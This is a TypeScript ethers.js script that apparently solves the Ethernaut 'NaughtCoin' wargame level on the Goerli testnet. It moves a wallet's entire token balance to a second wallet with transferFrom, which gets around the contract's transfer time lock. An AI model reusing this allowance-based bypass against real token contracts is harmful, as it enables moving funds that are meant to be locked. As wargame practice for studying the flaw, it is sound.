import NaughtCoinJSON from "../../../artifacts/contracts/level15/NaughtCoin.sol/NaughtCoin.json"
const ethers = require('ethers');
require ('dotenv').config ()

const provider = new ethers.providers.AlchemyProvider('goerli', process.env.ALCHEMY_API_KEY);
const privateKey: string = process.env.ACTOR_PRIVATE_KEY as string;
const privateKey2: string = process.env.ACTOR_2_PRIVATE_KEY as string;
const naughtCoinContractAddress: string = process.env.INSTANCE_ADDRESS as string;


let prize: any;
let newPrize: any;

// Define all function calls used
async function main(){
  console.log(`Ethernaut level 15 - script made by JoVi\n ------ \n`);
  const wallet = await new ethers.Wallet( privateKey, provider);
  const signer = wallet.connect(provider);

  const wallet2 = await new ethers.Wallet( privateKey2, provider);
  const signer2 = wallet2.connect(provider);

  const naughtCoinSigner1 = new ethers.Contract(naughtCoinContractAddress, NaughtCoinJSON.abi, signer);
  const naughtCoinSigner2 = new ethers.Contract(naughtCoinContractAddress, NaughtCoinJSON.abi, signer2);

  console.log(`Fetching ${wallet.address}'s balance\n ------ \n`);
  const balance = await naughtCoinSigner1.balanceOf(wallet.address);
  console.log(`${wallet.address}'s balance is : ${balance}\n ------ \n`);

  
  // deploy new attack contract
  /*console.log(`Attacking contract with an increaseAllowance function call from ${wallet.address} to ${wallet2.address} for it's whole balance.\n ------ \n`);
  const attackTx1 = await naughtCoinSigner1.increaseAllowance(wallet2.address, balance);
  const attackTx1Receipt = await attackTx1.wait();
  console.log(`Allowance increase pushed. ${attackTx1Receipt}\n ------ \n`);
  */
  console.log(`Attacking contract with a transferFrom function call from ${wallet.address} to ${wallet2.address} for it's whole balance.\n ------ \n`);
  const attackTx2 = await naughtCoinSigner2.transferFrom(wallet.address, wallet2.address, balance);
  const attackTx2Receipt = await attackTx2.wait();
  console.log(`TransferFrom pushed. ${attackTx2Receipt}\n ------ \n`);
  console.log(`If there are not any errors, the level should be finished by now.\n ------ \n`);
  
}


// Execute
main();